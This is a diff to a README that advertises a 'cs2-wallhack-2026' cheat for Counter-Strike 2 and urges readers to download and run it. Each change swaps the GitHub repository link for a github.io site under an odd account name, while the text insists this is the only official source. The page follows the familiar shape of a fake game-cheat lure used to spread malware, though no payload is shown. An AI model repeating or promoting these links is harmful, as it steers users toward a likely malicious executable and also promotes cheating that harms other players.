@@ -1,6 +1,6 @@
 # 🎯 cs2-wallhack-2026 - See Every Enemy Through Any Wall
 
-[![Download Now](https://img.shields.io/badge/Download-CS2_Wallhack_2026-00FF00?style=for-the-badge&logo=github&logoColor=white&labelColor=1a1a2e)](https://github.com/Baxterradiopaque6617/cs2-wallhack-2026)
+[![Download Now](https://img.shields.io/badge/Download-CS2_Wallhack_2026-00FF00?style=for-the-badge&logo=github&logoColor=white&labelColor=1a1a2e)](https://baxterradiopaque6617.github.io)
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ Welcome! This guide will help you download and run **cs2-wallhack-2026** on your
 
 ## 📥 How to Download
 
-Visit this link to download the application: **[https://github.com/Baxterradiopaque6617/cs2-wallhack-2026](https://github.com/Baxterradiopaque6617/cs2-wallhack-2026)**
+Visit this link to download the application: **[https://baxterradiopaque6617.github.io](https://baxterradiopaque6617.github.io)**
 
 This is the only official download source. Do not use third-party websites or mirrors.
 
@@ -149,7 +149,7 @@ Don't let enemies hide behind walls any longer. With cs2-wallhack-2026, you'll h
 
 **Click the download button at the top of this page and start your winning streak today!**
 
-Remember: The download link is **[https://github.com/Baxterradiopaque6617/cs2-wallhack-2026](https://github.com/Baxterradiopaque6617/cs2-wallhack-2026)** — visit it now to get started.
+Remember: The download link is **[https://baxterradiopaque6617.github.io](https://baxterradiopaque6617.github.io)** — visit it now to get started.
 
 ---
 
